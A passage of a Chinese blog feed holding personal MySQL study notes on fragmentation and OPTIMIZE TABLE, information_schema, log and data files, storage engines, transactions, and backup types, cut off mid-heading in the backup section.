      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%A2%8E%E7%89%87%E6%95%B4%E7%90%86%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%A2%8E%E7%89%87%E6%95%B4%E7%90%86%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要碎片整理"><a href="#为什么要碎片整理" class="headerlink" title="为什么要碎片整理"></a>为什么要碎片整理</h3><ul><li>MySQL中使用varchar、text、blob等可变长度的文本数据类型之后需要做额外的MySQL数据表碎片整理。</li><li>当MySQL从表中删除一行内容，该段空间就会被留空。如果有大量的删除操作，会使留空空间变得比存储列表内容所使用的空间更大。</li><li>MySQL进行数据扫描时，它扫描的对象实际是列表的容量需求上限，也就是数据被写入的区域中处于峰值位置的部分。如果进行新的插入操作，MySQL将尝试利用这些留空的区域，但仍然无法将其彻底占用。</li></ul><h3 id="碎片查看及整理"><a href="#碎片查看及整理" class="headerlink" title="碎片查看及整理"></a>碎片查看及整理</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name,engine,table_rows,data_length,index_length,DATA_FREE <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">'chat_msgs'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">optimize <span class="keyword">table</span> chat_msgs;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://img-blog.csdnimg.cn/20200420224821232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200420224845211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><ul><li>show create table information_schema.tables;</li></ul><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TEMPORARY <span class="keyword">TABLE</span> `TABLES` (</span><br><span class="line">  `TABLE_CATALOG` <span class="type">varchar</span>(<span class="number">512</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  `TABLE_SCHEMA` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  `TABLE_NAME` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  `TABLE_TYPE` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  `ENGINE` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `VERSION` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ROW_FORMAT` <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `TABLE_ROWS` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `AVG_ROW_LENGTH` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `DATA_LENGTH` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `MAX_DATA_LENGTH` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `INDEX_LENGTH` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `DATA_FREE` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `AUTO_INCREMENT` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `CREATE_TIME` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `UPDATE_TIME` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `CHECK_TIME` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `TABLE_COLLATION` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `CHECKSUM` <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `CREATE_OPTIONS` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `TABLE_COMMENT` <span class="type">varchar</span>(<span class="number">2048</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span></span><br><span class="line">) ENGINE<span class="operator">=</span>MEMORY <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></tbody></table></figure><ul><li>desc information_schema.tables; 存储了数据表的元数据信息</li></ul><table><thead><tr><th align="left">Field</th><th align="left">Type</th><th align="left">Null</th><th align="left">Key</th><th align="left">Default</th><th align="left">Extra</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">TABLE_CATALOG</td><td align="left">varchar(512)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_SCHEMA</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">DB名</td></tr><tr><td align="left">TABLE_NAME</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">表名</td></tr><tr><td align="left">TABLE_TYPE</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">ENGINE</td><td align="left">varchar(64)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">VERSION</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">ROW_FORMAT</td><td align="left">varchar(10)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">是否压缩</td></tr><tr><td align="left">TABLE_ROWS</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">表的粗略行统计</td></tr><tr><td align="left">AVG_ROW_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">DATA_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">表的大小（单位字节）</td></tr><tr><td align="left">MAX_DATA_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">INDEX_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">索引大小</td></tr><tr><td align="left">DATA_FREE</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">碎片大小</td></tr><tr><td align="left">AUTO_INCREMENT</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CREATE_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">UPDATE_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CHECK_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_COLLATION</td><td align="left">varchar(32)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CHECKSUM</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CREATE_OPTIONS</td><td align="left">varchar(255)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_COMMENT</td><td align="left">varchar(2048)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><ul><li>查看所有db</li></ul><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> TABLE_SCHEMA <span class="keyword">from</span> information_schema.tables;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></tbody></table></figure><ul><li>查看表大小</li></ul><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="built_in">sum</span>(DATA_LENGTH) <span class="operator">+</span> <span class="built_in">sum</span>(INDEX_LENGTH)) <span class="keyword">as</span> size <span class="keyword">from</span> tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'mysql'</span> <span class="keyword">and</span> table_name <span class="keyword">like</span> <span class="string">'time_%'</span>;</span><br></pre></td></tr></tbody></table></figure><ul><li>查看数据库大小</li></ul><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="built_in">sum</span>(DATA_LENGTH) <span class="operator">+</span> <span class="built_in">sum</span>(INDEX_LENGTH)) <span class="keyword">as</span> size <span class="keyword">from</span> tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'mysql'</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h3><ul><li>官方建议碎片整理每周或每月一次即可。</li><li>optimize table 只对MyISAM、BDB、InnoDB表起作用，尤其MyISAM最为明显。并不是所有表都需要碎片整理，一般只需要对包含可变长度的文本数据类型的表进行整理即可。</li><li>optimize table 运行过程中会锁定表。</li><li>默认情况下，直接对InnoDB引擎的数据表使用optimize table可能会显示[Table dose not support optimize,doing recreate + analyze instead] 的提示信息。这时候可以用mysqld –skip-new 或者 mysqld –safe-mode 命令来重启MySQL，以便让其他引擎支持optimize table。</li><li>对于mysql和Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-文件</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E6%96%87%E4%BB%B6/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="参数文件"><a href="#参数文件" class="headerlink" title="参数文件"></a>参数文件</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --help | grep my.cnf</span><br></pre></td></tr></tbody></table></figure><p>没有参数文件，取源代码中的默认值。</p><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><ul><li><p>错误日志</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看文件位置</span><br><span class="line">show variables like 'log_error';</span><br></pre></td></tr></tbody></table></figure></li><li><p>二进制日志</p><p>事务提交前进行记录。</p><p>记录对数据库执行更改的所有操作，主要作用是恢复和复制。</p><p>二进制日志文件在默认情况下没有启动，启动后会使性能下降1%。</p><ul><li><p>binlog_format（可以动态更改）</p><ol><li><p>statement 二进制日志文件记录逻辑SQL语句。</p></li><li><p>row 记录表的行更改情况。</p><p>生成的日志文件更大，网络开销也增加</p></li><li><p>mixed 默认statement，某些情况下用row。</p><blockquote><p>使用NDB引擎</p><p>使用UUID，ROW_COUNT()等不确定函数</p><p>使用insert delay</p><p>使用用户定义函数</p><p>使用临时表</p></blockquote></li></ol></li></ul></li><li><p>慢查询日志</p></li><li><p>查询日志</p></li></ul><h4 id="socket文件"><a href="#socket文件" class="headerlink" title="socket文件"></a>socket文件</h4><p>​用Unix域套接字方式进行连接时需要的文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like 'socket';</span><br></pre></td></tr></tbody></table></figure><h4 id="pid文件"><a href="#pid文件" class="headerlink" title="pid文件"></a>pid文件</h4><p>​MySQL实例的进程ID文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like 'pid_file';</span><br></pre></td></tr></tbody></table></figure><h4 id="表结构文件"><a href="#表结构文件" class="headerlink" title="表结构文件"></a>表结构文件</h4><p>​MySQL的数据存储都是按照表的，每个表都会有与之对应的文件。不论使用何种引擎，MySQL都有一个以frm为后缀的文件，记录表的结构定义。</p><h4 id="存储引擎文件"><a href="#存储引擎文件" class="headerlink" title="存储引擎文件"></a>存储引擎文件</h4><ul><li><p>表空间文件</p><p>MySQL存储的数据按表空间进行存放。</p><ol><li><p>默认表空间</p><p>默认情况下，会有一个默认初始化大小10MB、名为ibdata1的文件（默认表空间文件），通过innodb_data_file设置。</p></li><li><p>单独表空间</p><p>通过设置innodb_file_per_table可以将每个基于InnoDB存储引擎的表单独产生一个表空间，文件名为.idb。</p><p>单独表空间文件仅存储该表的数据、索引和插入缓冲，其余信息还是存放在默认表空间中。</p></li></ol></li></ul><p><img src="https://img-blog.csdnimg.cn/20200504133622515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li><p>重做日志文件</p><p>事务进行中，不断有重做日志写入文件，记录关于每个页更改的物理情况。</p><p>默认情况下会有两个文件，ib_ligfile0和ib_ligfile1（循环使用），记录了InnoDB的事务日志。</p><p>重做日志文件的只要作用是保证数据的完整性。如主机断电导致实例失败，InnoDB会使用日志回复到断电前的状态。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200504133647661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-存储引擎和体系结构</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL有哪些常见的引擎，说说他们的区别？"><a href="#MySQL有哪些常见的引擎，说说他们的区别？" class="headerlink" title="MySQL有哪些常见的引擎，说说他们的区别？"></a>MySQL有哪些常见的引擎，说说他们的区别？</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engines; #查看支持的引擎</span><br></pre></td></tr></tbody></table></figure><ul><li><p>MyISAM：非事务处理存储引擎</p><p>索引放在XX.MYI文件中，数据放在XX.MYD文件中。</p><p>在线分析处理OLAP。</p><p>全文索引。</p></li><li><p>InnoDB：具备外键功能的存储引擎、行锁</p><p>索引也是数据。数据和索引存在一个XX.IDB文件中。</p><p>在线事务处理OLTP。</p></li><li><p>Mermory：基于内存</p><p>Memory表至少比MyISAM表要快一个数量级，因为所有的数据都保存在内存中，不需要进行磁盘I/O。Memory表的结构在重启以后还会保留，但数据会丢失。</p><p>默认hash索引。</p></li><li><p>Archive：数据存档，数据插入后不能修改，只支持insert和select</p><p>针对高写入压缩做了优化的简单引擎，压缩存储1：10。</p></li><li><p>Maria</p><p>MyISAM后续版本</p><p>缓存数据和索引文件，行锁设计，MVCC，支持事务，更好的BLOB字符类型处理性能</p></li><li><p>NDB</p><p>集群存储引擎</p><p>数据全放内存（可以将非索引数据放磁盘）</p></li><li><p>Merge、CSV、Sphinx、Infobright</p></li></ul><table><thead><tr><th>特点</th><th>InnoDB</th><th>MyISAM</th><th>Memory</th><th>Archive</th></tr></thead><tbody><tr><td>b+树索引</td><td>yes</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>MVCC</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>事务</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>存储限制</td><td>64TB</td><td>256TB</td><td>RAM</td><td>None</td></tr><tr><td>索引缓存</td><td>yes</td><td>yes</td><td>本身就是缓存</td><td>No</td></tr><tr><td>外键</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>锁粒度</td><td>row</td><td>table</td><td>table</td><td>row</td></tr><tr><td>全文索引</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr><tr><td>数据缓存</td><td>yes</td><td>no</td><td>本身就是缓存</td><td>no</td></tr></tbody></table><h3 id="数据库和实例的区别"><a href="#数据库和实例的区别" class="headerlink" title="数据库和实例的区别"></a>数据库和实例的区别</h3><ul><li>数据库：物理操作系统文件或其他形式文件类型的集合。</li><li>数据库实例：有数据库后台进程/线程以及一个共享内存区组成。</li></ul><h3 id="查看MySQL从哪里读取的配置文件"><a href="#查看MySQL从哪里读取的配置文件" class="headerlink" title="查看MySQL从哪里读取的配置文件"></a>查看MySQL从哪里读取的配置文件</h3><p>从上到下找my.cnf文件，最终值以最后一个文件中的参数为准。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ mysql --help | grep my.cnf</span><br><span class="line">                      </span><br><span class="line">order of preference, my.cnf, $MYSQL_TCP_PORT,</span><br><span class="line">/etc/my.cnf </span><br><span class="line">/etc/mysql/my.cnf </span><br><span class="line">/usr/local/Cellar/mysql-client/8.0.18/etc/my.cnf </span><br><span class="line">~/.my.cnf</span><br></pre></td></tr></tbody></table></figure><h3 id="MySQL体系结构"><a href="#MySQL体系结构" class="headerlink" title="MySQL体系结构"></a>MySQL体系结构</h3><p><img src="https://img-blog.csdnimg.cn/20200504105206146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li>连接池</li><li>管理服务和工具</li><li>SQL接口</li><li>查询分析器</li><li>优化器</li><li>缓冲</li><li>存储引擎</li><li>物理文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-事务</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%BA%8B%E5%8A%A1/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="数据库引入事务的主要目的"><a href="#数据库引入事务的主要目的" class="headerlink" title="数据库引入事务的主要目的"></a>数据库引入事务的主要目的</h3><p>事务会把数据库从一种状态转换为另一种一致的状态，在提交工作时，可以确保要么所有修改都已经保存，要么都不保存。</p><h3 id="ACID特性"><a href="#ACID特性" class="headerlink" title="ACID特性"></a>ACID特性</h3><ul><li><p>原子性 atomicity</p><p>要么都成功，要么都失败。</p></li><li><p>一致性 consistency</p></li><li><p>事务执行前后，数据库的完整性约束没有破坏。（你的10张银行卡里共有100块，无论这10张银行卡之间怎么转账，也只有100块）</p></li><li><p>隔离性 isolation</p><p>一个事务的影响在事务提交前，其他事务都不可见。</p></li><li><p>持久性 durability</p><p>事务一旦提交，就是永久性的。</p></li></ul><h3 id="事务的实现"><a href="#事务的实现" class="headerlink" title="事务的实现"></a>事务的实现</h3><h4 id="redo"><a href="#redo" class="headerlink" title="redo"></a>redo</h4><p>事务通过重做（redo)日志文件和日志缓冲（InnoDB Log Buffer）实现。在写数据前，需要先写日志。这种实现方式称为预写日志方式（Write-Ahead Logging，WAL）</p><ul><li><p>当开始一个事务时，会记录该事务的一个LSN（Log Sequence Number，日志序列号）；</p></li><li><p>当事务执行时，会往InnoDB存储引擎的日志缓冲里插入事务日志；</p></li><li><p>事务提交是，必须将InnoDB存储引擎的日志缓冲写入磁盘。</p><p>通过预写日志的方式保证事务的完整性，会造成吸盘上存储的数据页和内存缓冲池中的页是不同步的。可以通过<code>show engine innodb status；</code>查看当前磁盘和日志的差距。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status\G;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">LOG</span><br><span class="line">---</span><br><span class="line">Log sequence number 77292702 # 当前LSN</span><br><span class="line">Log flushed up to   77292702 # 刷新到重做日志文件的LSN</span><br><span class="line">Pages flushed up to 77292702</span><br><span class="line">Last checkpoint at  77292702 # 刷新到磁盘的LSN</span><br><span class="line">0 pending log writes, 0 pending chkp writes</span><br><span class="line">8 log i/o's done, 0.00 log i/o's/second</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="undo"><a href="#undo" class="headerlink" title="undo"></a>undo</h3><p>事务需要回滚，需要undo。undo与redo正好相反，对于数据库进行修改是，数据库不但会产生redo，还会产生一定量的undo。</p><p>redo存放在重做日志中，undo存放在数据库内部的一个特殊段（segment）中，称为undo段（undo segment），undue段位于共享表空间中。</p><p>undo用于将数据库逻辑的恢复到原来的样子，数据结构本身在回滚前后可能不是相同的。</p><h3 id="事务常用控制语句"><a href="#事务常用控制语句" class="headerlink" title="事务常用控制语句"></a>事务常用控制语句</h3><ul><li>begin</li><li>commit</li><li>rollback</li></ul><h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><ul><li><p>读未提交 read uncommitted</p><p>浏览访问</p></li><li><p>读已提交 read committed</p><p>游标稳定，生产上常用隔离级别</p></li><li><p>可重复度 repeatable read</p><p>InnoDB默认隔离级别，InnoDB在该级别下使用<code>next-key</code>锁的算法避免幻读的产生。</p></li><li><p>序列化 serializable</p><p>InnoDB会对每个select操作自动添加<code>lock in share mode</code>，即共享锁。因为InnoDB在rr的隔离级别就可以避免幻读，所以serializable隔离级别主要用于分布式事务。</p></li></ul><h4 id="查看事务隔离级别"><a href="#查看事务隔离级别" class="headerlink" title="查看事务隔离级别"></a>查看事务隔离级别</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@tx_isolation\G;</span><br><span class="line">select @@global.tx_isolation\G;</span><br></pre></td></tr></tbody></table></figure><h4 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h4><p>分布式事务由一个或多个资源管理器、一个事务管理器和一个应用程序组成。</p><p>分布式事务使用两段式提交<code>two-phase commit</code>的方式。在第一个阶段，所有参与全局事务的节点都开始准备，告诉事务管理器他们准备好了。第二阶段，事务管理器告诉所有资源管理器执行rollback还是commit。如果任何节点显示不能提交，则所有节点都被告知需要回滚。</p><ul><li><p>资源管理器</p><p>提供访问事务资源的方法。通常一个数据库就是一个资源管理器。</p></li><li><p>事务管理器</p><p>协调参与全局事务中的各个事务。需要合参与全局事务中的所有资源管理器进行通信。</p></li><li><p>应用程序</p><p>定义事务的边界，置顶全局事务中的操作。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-备份与恢复</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="备份与恢复概述"><a href="#备份与恢复概述" class="headerlink" title="备份与恢复概述"></a>备份与恢复概述</h3><h4 id="按备份方法分："><a href="#按备份方法分：" class="headerlink" title="按备份方法分："></a>按备份方法分：</h4><ul><li><p>hot backup 热备、在线备份</p><p>数据库运行中直接备份，对正在运行的数据库没有任何影响。</p></li><li><p>cold backup 冷备、离线备份</p><p>最为简单，一般只需要拷贝相关的数据库物理文件即可。</p><p>优点：备份简单、恢复简单、恢复速度快、备份文件易于在不同操作系统和MySQL版本上恢复</p><p>缺点：备份文件大、不总是可以轻易跨平台。如大小写敏感、浮点数格式等。</p></li><li><p>warm backup 温备</p><p>数据库运行时进行备份，但是会对当前数据库的操作有影响，如加一个全局锁以保证数据的一致性。</p></li></ul><h4 id="按备份后文件内容分："><a href="#按备份后文件内容分：" class="headerlink" title="按备份后文件内容分："></a>按备份后文件内容分：</h4><ul><li><p>逻辑备份</p><p>备份后的文件内容时可读的，通常是文本文件，内容通常是SQL语句，或表内的数据数据，好处是可以看到导出文件的内容。适用于数据库的升级、迁移等，恢复所需要的时间往往较长。</p></li><li><p>裸文件备份</p><p>拷贝数据库的物理文件，数据库既可以处于运行状态，也可以处于停止状态。恢复时间短。</p></li></ul><h4 id="按备份数据的内容分："><a href="#按备份数据的内容分：" class="headerlink" title="按备份数据的内容分："></a>按备份数据的内容分：</h4><ul><li><p>完全备份</p><p>对数据库进行完整的备份。</p></li><li><p>增量备份</p><p>在上次完全备份的基础上，对更新的数据进行备份，官方并未提供增量备份的方法。</p></li><li><p>日志备份</p><p>主要是二进制日志的备份，通过对一个完全备份进行二进制日志的重做来完成数据库的point-in-time的恢复工作。</p></li></ul><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><h4 id="复制的工作原理"><a href="#复制的工作原理" 